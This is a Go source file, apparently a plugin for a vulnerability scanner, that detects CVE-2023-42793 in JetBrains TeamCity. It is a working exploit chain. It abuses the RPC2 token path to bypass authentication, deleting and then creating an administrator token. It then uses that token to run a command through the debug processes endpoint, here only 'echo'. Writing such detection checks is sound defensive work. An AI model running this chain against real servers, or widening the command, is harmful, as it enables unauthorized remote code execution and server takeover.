package goplugin

import (
	"Yscanner/utils"
	"fmt"
	"net/http"
	"regexp"
	"strings"
)

func init() {
	Register("jetbrains_teamcity_rce", &jetbrains_teamcity_rce{})
}

type jetbrains_teamcity_rce struct{}

func (p *jetbrains_teamcity_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "JetBrains TeamCity RCE漏洞",
		VulnInfo: "TeamCity是一款功能强大的持续集成（Continue Integration）工具，包括服务器端和客户端，支持Java，.NET项目开发。攻击者可构造恶意请求创建token，并利用相关功能执行任意代码，控制服务器。",
		VulnID:   "CVE-2023-42793",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "TeamCity On-Premises < 2023.05.04",
		CWE:      "CWE-288	使用候选路径或通道进行的认证绕过",
	}
}

func (p *jetbrains_teamcity_rce) Check(netloc string) bool {
	req0, err := http.NewRequest("DELETE", netloc+"/app/rest/users/id:1/tokens/RPC2", nil)
	if err != nil {
		return false
	}
	_, err = utils.RequestDo(req0, false, 2)
	if err != nil {
		return false
	}

	req1, err := http.NewRequest("POST", netloc+"/app/rest/users/id:1/tokens/RPC2", nil)
	if err != nil {
		return false
	}
	resp1, err := utils.RequestDo(req1, true, 2)
	if err != nil {
		return false
	}

	if resp1.Other.StatusCode == 200 && strings.Contains(resp1.ResponseRaw, "<token name=\"RPC2\" creationTime") {
		re := regexp.MustCompile(`value="([^\"]+)"`)
		match := re.FindStringSubmatch(resp1.ResponseRaw)
		if len(match) <= 1 {
			return false
		}
		token := match[1]

		rand := utils.GenRandom(10)
		payload := fmt.Sprintf("/app/rest/debug/processes?exePath=echo&params=%s", rand)
		req, err := http.NewRequest("POST", netloc+payload, nil)
		if err != nil {
			return false
		}
		req.Header.Set("Authorization", "Bearer "+token)
		resp, err := utils.RequestDo(req, true, 2)
		if err != nil {
			return false
		}

		if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "StdOut:"+rand) {
			return true
		}
	}

	return false
}
